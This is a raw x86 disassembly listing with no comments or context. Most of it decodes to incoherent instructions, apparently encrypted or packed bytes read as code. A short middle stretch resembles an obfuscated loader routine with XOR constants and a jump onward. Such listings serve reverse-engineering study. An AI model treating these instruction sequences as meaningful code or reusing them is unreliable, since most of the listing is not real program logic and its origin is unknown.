  41379e:	imul   esi,DWORD PTR [edx],0x70580c02
  4137a4:	enter  0x2aa0,0x2e
  4137a8:	xor    al,0x44
  4137aa:	push   esi
  4137ab:	sbb    al,ch
  4137ad:	pslld  mm1,mm0
  4137b0:	add    eax,0x505e259c
  4137b5:	push   ss
  4137b6:	mov    ebp,0xb5a988ab
  4137bb:	mov    esi,0x4a409099
  4137c0:	jno    0x413745
  4137c2:	mov    ds:0x3fd32028,al
  4137c7:	cli    
  4137c8:	scas   eax,DWORD PTR es:[edi]
  4137c9:	jmp    0x7f18:0xab16335f
  4137d0:	xchg   esp,esi
  4137d2:	mov    bl,0xdb
  4137d4:	pop    edx
  4137d5:	xchg   esp,eax
  4137d6:	fimul  DWORD PTR [ebp+0x69a9906f]
  4137dc:	(bad)  
  4137dd:	call   0xe60:0xca7ddcce
  4137e4:	xor    BYTE PTR [ecx+0x3a],ah
  4137e7:	gs outs dx,BYTE PTR ss:[esi]
  4137ea:	sbb    cl,al
  4137ec:	repz add al,0xa3
  4137ef:	add    BYTE PTR [eax],ch
  4137f1:	jmp    0x41377e
  4137f3:	call   0x98b856a
  4137f8:	icebp  
  4137f9:	mov    DWORD PTR [edx+eax*8+0x109f6935],edx
  413800:	sbb    DWORD PTR [si+0x46],esp
  413804:	cmp    BYTE PTR [eax],dh
  413806:	mov    bh,0xfe
  413808:	sub    bl,BYTE PTR [eax]
  41380a:	ins    BYTE PTR es:[edi],dx
  41380b:	cs (bad) 
  41380e:	pop    ebx
  41380f:	sbb    ecx,edx
  413811:	xor    eax,0xbc459362
  413816:	fmulp  st(5),st
  413818:	xchg   esi,eax
  413819:	sub    esi,edx
  41381b:	xor    al,0xbd
  41381d:	add    ecx,DWORD PTR [esi+0x5df23300]
  413823:	in     eax,0x54
  413825:	xor    cl,BYTE PTR [edi]
  413827:	cmp    BYTE PTR [eax],al
  413829:	adc    dh,BYTE PTR [edi+0x4b]
  41382c:	inc    esp
  41382d:	not    BYTE PTR [ebx-0x18]
  413830:	std    
  413831:	sub    bl,BYTE PTR [esi-0x20]
  413834:	xchg   edx,eax
  413835:	out    dx,eax
  413836:	inc    edi
  413837:	test   eax,0x4ea691c7
  41383c:	loope  0x413802
  41383e:	je     0x413887
  413840:	or     al,0x4b
  413842:	data16 sbb al,0xc
  413845:	sub    ecx,0xffffffb5
  413848:	adc    eax,0xe9207b2
  41384e:	jo     0x41384c
  413850:	out    0x91,al
  413852:	xchg   edi,eax
  413853:	adc    ch,bl
  413855:	sbb    BYTE PTR [ecx],0x51
  413858:	and    ch,BYTE PTR [edx]
  41385a:	daa    
  41385b:	sub    DWORD PTR [eax-0x32],esp
  41385e:	or     DWORD PTR [ebx],ebp
  413860:	in     al,dx
  413861:	lods   eax,DWORD PTR ds:[esi]
  413862:	in     eax,0x9f
  413864:	jge    0x41384e
  413866:	in     eax,dx
  413867:	stos   DWORD PTR es:[edi],eax
  413868:	mov    edx,edx
  41386a:	pop    ds
  41386b:	jmp    0xd14a:0xd326a025
  413872:	push   0x3f
  413874:	dec    esp
  413875:	and    BYTE PTR [ebx],dl
  413877:	push   eax
  413878:	aas    
  413879:	test   al,0xb8
  41387b:	fwait
  41387c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41387d:	gs push ss
  41387f:	ja     0x4138e4
  413881:	xor    DWORD PTR [esp+eiz*2+0x64bfe0d7],esi
  413888:	jp     0x41382f
  41388a:	imul   ebx,DWORD PTR [eax],0xe66f7cf7
  413890:	adc    cl,0xfd
  413893:	jmp    0x18c660c8
  413898:	push   ebx
  413899:	xor    eax,0x319e8467
  41389e:	out    dx,eax
  41389f:	aaa    
  4138a0:	sbb    al,0x59
  4138a2:	pop    ecx
  4138a3:	cmp    DWORD PTR [edx-0x75f30553],edx
  4138a9:	popf   
  4138aa:	pop    edi
  4138ab:	les    esp,FWORD PTR [eax-0x3]
  4138ae:	enter  0x4b73,0x70
  4138b2:	les    ebx,FWORD PTR [ebx-0x7a]
  4138b5:	mov    dl,0x91
  4138b7:	hlt    
  4138b8:	int3   
  4138b9:	push   cs
  4138ba:	pushf  
  4138bb:	jno    0x4138a7
  4138bd:	pushf  
  4138be:	ret    0xff26
  4138c1:	push   ss
  4138c2:	pop    ds
  4138c3:	cmp    al,0xdf
  4138c5:	jae    0x41386a
  4138c7:	out    dx,eax
  4138c8:	sub    eax,0x7b6ce3d9
  4138cd:	mov    ecx,0xa10bd081
  4138d2:	xor    al,0xd3
  4138d4:	mov    edi,0xe3cb85eb
  4138d9:	adc    eax,0x157695ee
  4138de:	pop    ss
  4138df:	(bad)  
  4138e0:	loop   0x4138a4
  4138e2:	add    bl,bh
  4138e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4138e5:	ficomp DWORD PTR [esi-0x464c5b92]
  4138eb:	xchg   BYTE PTR [eax],cl
  4138ed:	dec    edx
  4138ee:	mov    bh,0x68
  4138f0:	aaa    
  4138f1:	in     al,dx
  4138f2:	add    eax,0x18351ae
  4138f7:	add    eax,0x9e445827
  4138fc:	gs push ds
  4138fe:	jle    0x41390d
  413900:	pop    esi
  413901:	add    al,0x56
  413903:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413904:	les    esp,FWORD PTR [ebx-0x38bc6c33]
  41390a:	stos   BYTE PTR es:[edi],al
  41390b:	adc    DWORD PTR [edi],ebp
  41390d:	mov    ebx,cs
  41390f:	add    BYTE PTR [ebx-0x35076ce9],al
  413915:	js     0x413991
  413917:	adc    DWORD PTR [ecx],edx
  413919:	jne    0x41391d
  41391b:	jmp    0x4e62:0xff664287
  413922:	(bad)  
  413924:	sti    
  413925:	scas   al,BYTE PTR es:[edi]
  413926:	mov    esi,0xb9b9204d
  41392b:	push   0xdd221632
  413930:	jp     0x41393a
  413932:	mov    WORD PTR [edx+0x54],fs
  413935:	lods   eax,DWORD PTR ds:[esi]
  413936:	or     ebx,DWORD PTR [edx+0x69ed64d2]
  41393c:	or     edx,ebx
  41393e:	add    al,0xf2
  413940:	mov    esp,0xafb50bce
  413945:	adc    DWORD PTR [edx+0x56],esi
  413948:	mov    WORD PTR [edi-0x30],?
  41394b:	pop    ebp
  41394c:	retf   
  41394d:	fs dec esp
  41394f:	dec    ecx
  413950:	out    dx,al
  413951:	sbb    al,0x32
  413953:	xor    DWORD PTR [edx],ebx
  413955:	pop    esi
  413956:	aad    0xe0
  413958:	xchg   DWORD PTR [eax+edi*4-0x5f],ecx
  41395c:	shl    BYTE PTR [esi+0x6],0x1e
  413960:	int3   
  413961:	pop    edx
  413962:	mov    bh,BYTE PTR [esi-0x4ba90dc7]
  413968:	push   ebx
  413969:	shr    BYTE PTR [ecx+0x12],1
  41396c:	sub    al,BYTE PTR [edi+0x6c6be3fc]
  413972:	cmp    edx,ebx
  413974:	out    dx,al
  413975:	icebp  
  413976:	popa   
  413977:	push   ds
  413978:	jns    0x413946
  41397a:	cld    
  41397b:	jge    0x4139c8
  41397d:	push   ebx
  41397e:	es push 0x36ab572e
  413984:	(bad)  
  413985:	jg     0x413949
  413987:	add    DWORD PTR [edx+esi*4],ecx
  41398a:	lea    ebp,[edi-0x7]
  41398d:	pop    edx
  41398e:	mov    ah,0x2e
  413990:	pop    edi
  413991:	lea    eax,[edx-0x2df825f7]
  413997:	pop    eax
  413998:	mov    ebp,0xfaef2799
  41399d:	sahf   
  41399e:	scas   eax,DWORD PTR es:[edi]
  41399f:	(bad)  
  4139a0:	dec    esp
  4139a1:	js     0x41396e
  4139a3:	mov    WORD PTR [esi],cs
  4139a5:	cs xchg ebp,eax
  4139a7:	inc    esi
  4139a8:	jmp    0x41399d
  4139aa:	ret    0xa9af
  4139ad:	int    0xae
  4139af:	loopne 0x41394a
  4139b1:	imul   esi,DWORD PTR [eax],0xfffffff8
  4139b4:	imul   esi
  4139b6:	popa   
  4139b7:	aad    0x34
  4139b9:	scas   al,BYTE PTR es:[edi]
  4139ba:	rcr    DWORD PTR [ecx],cl
  4139bc:	cld    
  4139bd:	aam    0x2a
  4139bf:	jbe    0x41395b
  4139c1:	push   ecx
  4139c2:	add    bl,al
  4139c4:	cmp    al,BYTE PTR [ecx+esi*8]
  4139c7:	js     0x4139a0
  4139c9:	sbb    DWORD PTR [edi],ebx
  4139cb:	sbb    al,0x4b
  4139cd:	cmp    eax,0x2754c798
  4139d2:	lea    esp,[eax-0x102c439f]
  4139d8:	test   eax,0xaffb851c
  4139dd:	ret    0x990c
  4139e0:	scas   eax,DWORD PTR es:[edi]
  4139e1:	mov    bh,0xe0
  4139e3:	mov    ebp,0x2cbf5441
  4139e8:	jns    0x4139e1
  4139ea:	inc    ecx
  4139eb:	and    edx,esi
  4139ed:	jns    0x4139ff
  4139ef:	mov    DWORD PTR [ebp+eiz*4+0x193c1dcb],ebx
  4139f6:	xchg   BYTE PTR [ebp+eax*8+0x21],ch
  4139fa:	test   dh,0xf1
  4139fd:	mov    ch,0x2e
  4139ff:	call   0x4b8a:0x7ba6d5ce
  413a06:	dec    eax
  413a07:	xchg   edx,eax
  413a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a09:	rol    BYTE PTR [ebx+0x73],cl
  413a0c:	mov    BYTE PTR [ebp-0x1ae4ccdc],dl
  413a12:	push   es
  413a13:	mov    edi,0xe02a7e4d
  413a18:	adc    al,0x29
  413a1a:	int    0x1b
  413a1c:	adc    edi,DWORD PTR [edx]
  413a1e:	arpl   WORD PTR [ebx+0x7f],bp
  413a21:	pop    ebx
  413a22:	sub    DWORD PTR ds:0x16d3393c,edx
  413a28:	pop    ebx
  413a29:	out    0xdd,eax
  413a2b:	jmp    0x7b5be6ed
  413a30:	fmul   DWORD PTR [edi-0x6cf2f070]
  413a36:	cld    
  413a37:	(bad)  
  413a38:	jmp    0x79d9:0x9313b7f
  413a3f:	and    bl,dl
  413a41:	and    dh,BYTE PTR es:[eax+eax*2]
  413a45:	xlat   BYTE PTR fs:[ebx]
  413a47:	cmp    BYTE PTR [esp+esi*4],0x80
  413a4b:	je     0x4139f9
  413a4d:	enter  0x85a4,0xce
  413a51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413a52:	sbb    DWORD PTR [ebx-0x5152ae1b],eax
  413a58:	mov    edx,0xe92fe576
  413a5d:	add    ebx,ebp
  413a5f:	jp     0x413a46
  413a61:	stos   BYTE PTR es:[edi],al
  413a62:	add    ebp,edx
  413a64:	and    DWORD PTR [edx],edi
  413a66:	sub    ebx,DWORD PTR [ecx+0x5d]
  413a69:	(bad)  
  413a6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a6b:	pop    ecx
  413a6c:	test   DWORD PTR ds:0x9e7d3a39,edx
  413a72:	cmp    bl,BYTE PTR [edi]
  413a74:	and    BYTE PTR [ecx+0x5f],0xd0
  413a78:	and    al,0x3
  413a7a:	outs   dx,BYTE PTR ds:[esi]
  413a7b:	retf   0x3e1c
  413a7e:	imul   ebx,DWORD PTR ds:0x241b068a,0x2f
  413a85:	or     ebp,edi
  413a87:	(bad)  
  413a89:	mov    cl,BYTE PTR [edi]
  413a8b:	xor    al,0xa3
  413a8d:	and    ebx,ecx
  413a8f:	jmp    DWORD PTR [eax-0x79]
  413a92:	push   cs
  413a93:	jns    0x413ac3
  413a95:	call   0x5b08:0x3b6cb51a
  413a9c:	xchg   edi,eax
  413a9d:	mov    ebp,0xd9dae28
  413aa2:	jmp    0x413a78
  413aa4:	aaa    
  413aa5:	fcmovbe st,st(6)
  413aa7:	(bad)  
  413aa8:	cmc    
  413aa9:	outs   dx,DWORD PTR ds:[esi]
  413aaa:	test   eax,0x980e8e8c
  413aaf:	cmp    dl,BYTE PTR [edx+edi*4]
  413ab2:	ss mov ebx,0xd9108e1a
  413ab8:	imul   DWORD PTR [eax+0x3b]
  413abb:	stos   BYTE PTR es:[edi],al
  413abc:	ret    0x7bcc
  413abf:	(bad)  
  413ac0:	cmp    cl,BYTE PTR [ebx-0x53169e03]
  413ac6:	fcomip st,st(2)
  413ac8:	mov    ds:0x4dfb3a35,eax
  413acd:	imul   esp,esp,0xffffffba
  413ad0:	dec    ebp
  413ad1:	ret    
  413ad2:	hlt    
  413ad3:	jmp    0x413b45
  413ad5:	add    ch,BYTE PTR [edx+0x106522c9]
  413adb:	or     BYTE PTR [ebx],dh
  413add:	leave  
  413ade:	cmc    
  413adf:	call   0xcc049833
  413ae4:	jae    0x413b13
  413ae6:	push   ebx
  413ae7:	int    0xb4
  413ae9:	sahf   
  413aea:	mov    BYTE PTR [eax+0x4e],bl
  413aed:	xor    eax,0x1fe5fb94
  413af2:	pop    ss
  413af3:	cmp    ebx,edi
  413af5:	or     bl,al
  413af7:	jg     0x413b1a
  413af9:	mov    ds:0xb4f7217,eax
  413afe:	into   
  413aff:	scas   eax,DWORD PTR es:[edi]
  413b00:	mov    dl,ah
  413b02:	and    BYTE PTR [edx*1-0x14b988e8],dh
  413b09:	sub    ebx,ebx
  413b0b:	mov    bl,0xc
  413b0d:	lahf   
  413b0e:	js     0x413b54
  413b10:	inc    ebx
  413b11:	ins    DWORD PTR es:[edi],dx
  413b12:	in     al,0x10
  413b14:	xor    DWORD PTR [esp+eax*2+0xa968460],0x4a
  413b1c:	lea    esp,[ebx-0x24ef55e0]
  413b22:	mov    dl,0x84
  413b24:	push   esi
  413b25:	(bad)  
  413b26:	ja     0x413b72
  413b28:	in     al,0xf5
  413b2a:	cwde   
  413b2b:	xchg   esp,eax
  413b2c:	mov    ecx,0xb5e6de1e
  413b31:	retf   0x324e
  413b34:	sub    eax,0xa8e9ca56
  413b39:	push   cs
  413b3a:	clc    
  413b3b:	jle    0x413b19
  413b3d:	push   esi
  413b3e:	out    dx,al
  413b3f:	pop    es
  413b40:	in     al,dx
  413b41:	sbb    ch,ch
  413b43:	lock sbb eax,0x9cf3f24a
  413b49:	inc    ebx
  413b4a:	mov    WORD PTR [ecx-0x5],?
  413b4d:	sub    esp,ecx
  413b4f:	bound  eax,QWORD PTR ds:0xadea5434
  413b55:	add    ah,BYTE PTR [edi]
  413b57:	xchg   ebp,eax
  413b58:	dec    esi
  413b59:	push   ss
  413b5a:	jle    0x413b0d
  413b5c:	xchg   BYTE PTR [ecx+0x78114cfa],bl
  413b62:	and    BYTE PTR [eax-0x75125b19],cl
  413b68:	daa    
  413b69:	sub    al,0xea
  413b6b:	mov    cl,0x87
  413b6d:	push   edi
  413b6e:	mov    ch,0x10
  413b70:	mov    dl,0x6
  413b72:	popa   
  413b73:	add    BYTE PTR [ebx+0x766499cc],ah
  413b79:	inc    eax
  413b7a:	sub    DWORD PTR gs:[ecx],ecx
  413b7d:	arpl   WORD PTR [ebx-0x4],dx
  413b80:	push   edi
  413b81:	adc    ebx,ebp
  413b83:	mov    DWORD PTR [edi+eiz*4+0x73],esp
  413b87:	and    edx,DWORD PTR [ebp-0x45c9d6e3]
  413b8d:	cld    
  413b8e:	inc    ecx
  413b8f:	in     al,dx
  413b90:	mov    WORD PTR [ebx+esi*8+0x6b],?
  413b94:	push   cs
  413b95:	cmc    
  413b96:	leave  
  413b97:	jle    0x413bb8
  413b99:	fiadd  WORD PTR [eax+0x3ab8e8fe]
  413b9f:	lods   al,BYTE PTR cs:[esi]
  413ba1:	add    dl,BYTE PTR [ebx-0x19]
  413ba4:	inc    ebx
  413ba5:	add    eax,0xfd1b863d
  413baa:	shl    DWORD PTR [ecx],1
  413bac:	ror    DWORD PTR [edi],cl
  413bae:	pusha  
  413baf:	cmp    DWORD PTR [ebx],ecx
  413bb1:	clc    
  413bb2:	in     al,0xd4
  413bb4:	adc    esp,DWORD PTR [ecx-0x907dd14]
  413bba:	adc    BYTE PTR [eax],bh
  413bbc:	and    eax,0x7bb977cb
  413bc1:	push   0x60
  413bc3:	or     BYTE PTR [edi],ah
  413bc5:	xor    BYTE PTR [ecx+edx*4+0x735a5836],bh
  413bcc:	mov    esi,0x2fee6991
  413bd1:	xchg   DWORD PTR [edi-0x249ebf45],eax
  413bd7:	inc    edx
  413bd8:	push   ds
  413bd9:	test   BYTE PTR [eax-0x2b],bl
  413bdc:	push   esi
  413bdd:	enter  0xffa3,0xb0
  413be1:	jecxz  0x413baf
  413be3:	in     eax,dx
  413be4:	loop   0x413bc7
  413be6:	mov    ebp,0x33e105ad
  413beb:	xor    dh,dl
  413bed:	push   0xe
  413bef:	sbb    BYTE PTR [edx-0x4],dl
  413bf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bf3:	and    dh,BYTE PTR [eax-0x69]
  413bf6:	dec    edi
  413bf7:	in     eax,dx
  413bf8:	add    al,0x4a
  413bfa:	pop    edx
  413bfb:	cld    
  413bfc:	stos   BYTE PTR es:[edi],al
  413bfd:	in     al,0xa6
  413bff:	sub    ch,BYTE PTR [ecx-0x7e]
  413c02:	fs pop esi
  413c04:	inc    ebx
  413c05:	popf   
  413c06:	mov    ch,0x6c
  413c08:	into   
  413c09:	add    DWORD PTR [edx+0x22cd00a7],ecx
  413c0f:	repz ret 
  413c11:	fs daa 
  413c13:	mov    al,0x1e
  413c15:	dec    ecx
  413c16:	xchg   edi,eax
  413c17:	inc    esi
  413c18:	or     dh,0xec
  413c1b:	fwait
  413c1c:	jg     0x413bcb
  413c1e:	cli    
  413c1f:	pop    ss
  413c20:	sbb    ah,BYTE PTR [ebx+0x24]
  413c23:	mov    ch,0xf8
  413c25:	imul   edi,DWORD PTR [eax],0xd0515c5a
  413c2b:	jbe    0x413c52
  413c2d:	pop    ecx
  413c2e:	add    al,0x23
  413c30:	sbb    bl,0xa3
  413c33:	inc    ebx
  413c34:	clc    
  413c35:	imul   esp,DWORD PTR [esi-0x4c],0x9072a39e
  413c3c:	push   esp
  413c3d:	mov    WORD PTR [edx+0x31],cs
  413c40:	dec    esp
  413c41:	fdivr  QWORD PTR [edx-0x18e621e2]
  413c47:	cli    
  413c48:	aad    0x66
  413c4a:	rol    BYTE PTR [ebx+0x3d715f1f],cl
  413c50:	sub    dh,al
  413c52:	fwait
  413c53:	clc    
  413c54:	and    al,0xd6
  413c56:	out    dx,eax
  413c57:	shl    BYTE PTR [esi+0x55],1
  413c5a:	cmc    
  413c5b:	repnz mov eax,ds:0xc155ea57
  413c61:	pop    ds
  413c62:	xchg   ebx,eax
  413c63:	jno    0x413cae
  413c65:	repnz test eax,0xb114b84c
  413c6b:	neg    ecx
  413c6d:	std    
  413c6e:	mov    cl,0xa5
  413c70:	pop    eax
  413c71:	add    al,BYTE PTR [edi+ecx*1+0x7811b564]
  413c78:	sahf   
  413c79:	xor    al,0x6a
  413c7b:	jbe    0x413c0d
  413c7d:	faddp  st(2),st
  413c7f:	xor    BYTE PTR [esi-0x2a],bh
  413c82:	dec    edi
  413c83:	out    0x8,eax
  413c85:	inc    esi
  413c86:	adc    edx,DWORD PTR [eax]
  413c88:	pop    ds
  413c89:	lahf   
  413c8a:	inc    edx
  413c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c8c:	mov    ds:0x3d4d6def,eax
  413c91:	outs   dx,DWORD PTR ds:[esi]
  413c92:	out    0x8,al
  413c94:	push   0xffffffb9
  413c96:	and    BYTE PTR [esi],cl
  413c98:	int    0x2b
  413c9a:	fdiv   QWORD PTR [edx]
  413c9c:	loopne 0x413caa
  413c9e:	push   0xffffffb3
  413ca0:	add    BYTE PTR [esp+ebp*2-0x53],bh
  413ca4:	sub    DWORD PTR [eax],edx
  413ca6:	(bad)  
  413ca7:	mov    dl,0xa4
  413ca9:	xchg   esp,eax
  413caa:	das    
  413cab:	inc    ebp
  413cac:	fdivr  st(7),st
  413cae:	lea    esi,[ebp-0x5]
  413cb1:	popa   
  413cb2:	fnsave [ecx]
  413cb4:	mov    ebx,0xcdc8a833
  413cb9:	out    dx,eax
  413cba:	dec    ecx
  413cbb:	test   al,0x63
  413cbd:	cmp    al,0xb3
  413cbf:	pop    es
  413cc0:	and    cl,BYTE PTR [esi-0x8d3fb8a]
  413cc6:	test   DWORD PTR [edx-0x36],esi
  413cc9:	lods   eax,DWORD PTR ds:[esi]
  413cca:	ficomp WORD PTR [ebx]
  413ccc:	push   ebx
  413ccd:	cdq    
  413cce:	cdq    
  413ccf:	js     0x413d2b
  413cd1:	jg     0x413cc8
  413cd3:	ins    BYTE PTR es:[edi],dx
  413cd4:	xor    al,0x18
  413cd6:	arpl   WORD PTR [ecx+0x53eae67],dx
  413cdc:	pop    es
  413cdd:	inc    ebx
  413cde:	inc    esi
  413cdf:	shr    BYTE PTR [edi+ebx*1-0x67],0xab
  413ce4:	mov    ah,0x4
  413ce6:	in     eax,0x4a
  413ce8:	mov    WORD PTR [eiz*8-0x2517d96e],cs
  413cef:	ficom  DWORD PTR [ecx]
  413cf1:	enter  0xdf8b,0x8c
  413cf5:	push   esi
  413cf6:	xchg   BYTE PTR [ebp-0x6c227ca4],dl
  413cfc:	mov    DWORD PTR [esi],edi
  413cfe:	mov    dl,0xf5
  413d00:	mov    ebx,0xa8109521
  413d05:	xchg   ebx,eax
  413d06:	sbb    BYTE PTR [ecx+ebx*8],cl
  413d09:	sar    DWORD PTR [eax+ecx*1-0x66],1
  413d0d:	dec    ebx
  413d0f:	pusha  
  413d10:	jne    0x413d43
  413d12:	xchg   edx,eax
  413d13:	fsubr  DWORD PTR [esi-0x39]
  413d16:	cmp    BYTE PTR [eax-0x543a4def],bl
  413d1c:	sbb    ecx,DWORD PTR [ebx]
  413d1e:	mov    fs,WORD PTR [esi]
  413d20:	cmp    ah,BYTE PTR [edi+0x23246c3a]
  413d26:	loopne 0x413cf7
  413d28:	sbb    eax,0x969288a1
  413d2d:	shl    dh,0x54
  413d30:	add    eax,0x8a525142
  413d35:	inc    ebx
  413d36:	and    cl,BYTE PTR [edi-0x5f042e81]
  413d3c:	cmp    ebx,DWORD PTR [eax-0x41]
  413d3f:	push   es
  413d40:	popa   
  413d41:	and    eax,0xccb8c054
  413d46:	inc    ebp
  413d47:	adc    al,0x43
  413d49:	outs   dx,BYTE PTR ds:[esi]
  413d4a:	test   DWORD PTR [ebx],ebx
  413d4c:	mov    ebx,0x8a47c6dc
  413d51:	inc    esp
  413d52:	loope  0x413d7c
  413d54:	mov    BYTE PTR [ebx-0x7ab2fb1f],ah
  413d5a:	jecxz  0x413dd1
  413d5c:	add    eax,0x5ee7c7c0
  413d61:	ins    DWORD PTR es:[edi],dx
  413d62:	shl    BYTE PTR [edi-0x52],0x20
  413d66:	mov    ecx,0x380ca015
  413d6b:	and    al,0x2a
  413d6d:	or     al,BYTE PTR [eax-0x76]
  413d70:	mov    eax,0x57f3f143
  413d75:	popf   
  413d76:	xchg   ebp,eax
  413d77:	mov    BYTE PTR [eax],bl
  413d79:	add    bh,ch
  413d7b:	adc    dh,BYTE PTR [eax+0x41]
  413d7e:	sub    ebx,ecx
  413d80:	xchg   ebx,ecx
  413d82:	dec    ecx
  413d83:	dec    ecx
  413d84:	mov    eax,DWORD PTR [ebp-0x1c]
  413d87:	imul   eax,ecx
  413d8a:	add    esp,eax
  413d8c:	xchg   edx,eax
  413d8d:	push   eax
  413d8e:	xor    ebx,ebx
  413d90:	mov    edx,esp
  413d92:	dec    edx
  413d93:	inc    ebx
  413d94:	add    ebx,DWORD PTR [edx+ebx*1]
  413d97:	dec    ebx
  413d98:	xor    edx,edx
  413d9a:	add    DWORD PTR [ebp-0x10],ebx
  413d9d:	pop    ebx
  413d9e:	mov    eax,DWORD PTR [ebp-0x10]
  413da1:	pop    edi
  413da2:	pop    esi
  413da3:	pop    ebx
  413da4:	leave  
  413da5:	ret    0x10
  413da8:	push   ebp
  413da9:	mov    ebp,esp
  413dab:	push   ecx
  413dac:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  413db3:	sub    DWORD PTR ds:0x42a2e6,ebx
  413db9:	mov    eax,DWORD PTR [ebp-0x4]
  413dbc:	and    DWORD PTR ds:0x42a2e6,0x0
  413dc6:	jmp    0x413dd8
  413dcb:	mov    edx,DWORD PTR ds:0x42a2e6
  413dd1:	inc    edx
  413dd2:	mov    DWORD PTR ds:0x42a2e6,edx
  413dd8:	cmp    DWORD PTR ds:0x42a2e6,0x1a
  413ddf:	jae    0x413e0a
  413de5:	cmp    DWORD PTR ds:0x42a2e6,0x2a
  413dec:	ja     0x413e0a
  413df2:	jmp    0x413e05
  413df7:	push   DWORD PTR [ebp-0x10]
  413dfa:	push   0x42a27e
  413dff:	call   DWORD PTR ds:0x42a3ce
  413e05:	jmp    0x413dcb
  413e0a:	mov    edx,DWORD PTR [ebp+0x10]
  413e0d:	mov    ecx,0x75108aa
  413e12:	xor    eax,ecx
  413e14:	sbb    DWORD PTR ds:0x42a2aa,0x2976
  413e1e:	add    eax,0x3272f1
  413e23:	xor    DWORD PTR ds:0x42a272,0x42a2b6
  413e2d:	mov    DWORD PTR [edx],eax
  413e2f:	mov    eax,DWORD PTR [ebp+0xc]
  413e32:	and    edx,DWORD PTR ds:0x42a2f2
  413e38:	xor    eax,ecx
  413e3a:	and    DWORD PTR ds:0x42a2de,edi
  413e40:	push   esi
  413e41:	mov    esi,DWORD PTR [ebp+0x10]
  413e44:	mov    edx,0x3272f1
  413e49:	add    eax,edx
  413e4b:	mov    DWORD PTR [esi+0x4],eax
  413e4e:	mov    eax,DWORD PTR [ebp+0x14]
  413e51:	mov    esi,DWORD PTR [ebp+0x10]
  413e54:	mov    DWORD PTR [esi+0x8],eax
  413e57:	mov    eax,DWORD PTR [ebp+0x18]
  413e5a:	mov    esi,DWORD PTR [ebp+0x10]
  413e5d:	mov    DWORD PTR [esi+0xc],eax
  413e60:	mov    eax,DWORD PTR [ebp+0x1c]
  413e63:	mov    esi,DWORD PTR [ebp+0x10]
  413e66:	mov    DWORD PTR [esi+0x10],eax
  413e69:	mov    eax,DWORD PTR [ebp+0x8]
  413e6c:	xor    eax,ecx
  413e6e:	add    eax,edx
  413e70:	jmp    0x416225
  413e75:	mov    esi,ebx
  413e77:	push   ebx
  413e78:	push   esi
  413e79:	or     edx,esi
  413e7b:	xchg   BYTE PTR [esi+0x72f8d7bb],ch
  413e81:	retf   
  413e82:	xchg   esi,eax
  413e83:	mov    cl,0x83
  413e85:	xchg   esp,eax
  413e86:	gs jl  0x413e0c
  413e89:	jmp    0x413ee9
  413e8b:	add    DWORD PTR [ebx+0xe3f4fd5],0xffffff87
  413e92:	sub    bl,ah
  413e94:	jmp    0x65a2caea
  413e99:	call   0x2e43:0xfd312d6d
  413ea0:	aas    
  413ea1:	xor    eax,0x4be84046
  413ea6:	push   es
  413ea7:	int3   
  413ea8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ea9:	inc    ebx
  413eaa:	mov    bl,dl
  413eac:	sti    
  413ead:	sahf   
  413eae:	sbb    al,0xe
  413eb0:	jl     0x413efc
  413eb2:	lods   eax,DWORD PTR ds:[esi]
  413eb3:	cmc    
  413eb4:	jmp    0xe9ea:0x5e618ff2
  413ebb:	cli    
  413ebc:	xchg   edi,eax
  413ebe:	repz sahf 
  413ec0:	sti    
  413ec1:	mov    cl,bl
  413ec3:	cdq    
  413ec4:	lods   al,BYTE PTR ds:[esi]
  413ec5:	(bad)  
  413ec6:	bound  ebx,QWORD PTR [esi]
  413ec8:	sti    
  413ec9:	mov    eax,ds:0x2fd4eb21
  413ece:	mov    DWORD PTR [edx+0x36],edi
  413ed1:	xchg   ecx,eax
  413ed2:	inc    ebp
  413ed3:	pop    edx
  413ed4:	je     0x413f11
  413ed6:	mov    ch,0xc0
  413ed8:	(bad)  
  413ed9:	cwde   
  413eda:	inc    edx
  413edb:	and    al,0xfd
  413edd:	push   0x3e
  413edf:	jp     0x413f00
  413ee1:	stos   BYTE PTR es:[edi],al
  413ee2:	jp     0x413eab
  413ee4:	inc    edx
  413ee5:	(bad)  
  413ee6:	dec    ebp
  413ee7:	push   ebx
  413ee8:	(bad)  
  413ee9:	adc    BYTE PTR [edi+eax*1-0x4f],bl
  413eed:	dec    edx
  413eee:	push   eax
  413eef:	sub    al,0x96
  413ef1:	cli    
  413ef2:	dec    eax
  413ef3:	cdq    
  413ef4:	push   0xfffffff5
  413ef6:	mov    BYTE PTR [edi+0x23a2fcbb],dh
  413efc:	sbb    DWORD PTR [ecx],edx
  413efe:	in     eax,dx
  413eff:	idiv   ecx
  413f01:	xor    DWORD PTR [eax-0x68e9e016],esp
  413f07:	pushf  
  413f08:	jg     0x413eb2
  413f0a:	sbb    BYTE PTR [edi-0x5f],ah
  413f0d:	call   DWORD PTR [ecx+ecx*1]
  413f10:	test   DWORD PTR [esi],esp
  413f12:	scas   al,BYTE PTR es:[edi]
  413f13:	xor    cl,dl
  413f15:	mov    DWORD PTR [eax],0x1d57a05a
  413f1b:	jle    0x413ec4
  413f1d:	stc    
  413f1e:	lahf   
  413f1f:	out    dx,eax
  413f20:	add    DWORD PTR [ebx-0x69],ebp
  413f23:	clc    
  413f24:	jecxz  0x413ec4
  413f26:	popa   
  413f27:	and    eax,0x317b336f
  413f2c:	xchg   ebx,eax
  413f2d:	inc    edi
  413f2e:	push   ebp
  413f2f:	fadd   DWORD PTR gs:[ebx]
  413f32:	mov    al,0xb4
  413f34:	int    0x13
  413f36:	add    ch,BYTE PTR [ecx+0x4f]
  413f39:	into   
  413f3a:	add    edx,DWORD PTR [ebp+0x6257bdd6]
  413f40:	pop    ebx
  413f41:	or     bl,BYTE PTR [edx+0x257e4e5e]
  413f47:	test   al,0xb2
  413f49:	xchg   esi,eax
  413f4a:	xor    DWORD PTR [edx-0x1128777a],0xfa33e8c1
  413f54:	pop    esp
  413f55:	outs   dx,BYTE PTR ds:[esi]
  413f56:	rol    DWORD PTR [edx-0x52ba6a2d],cl
  413f5c:	in     al,0x2f
  413f5e:	pop    esi
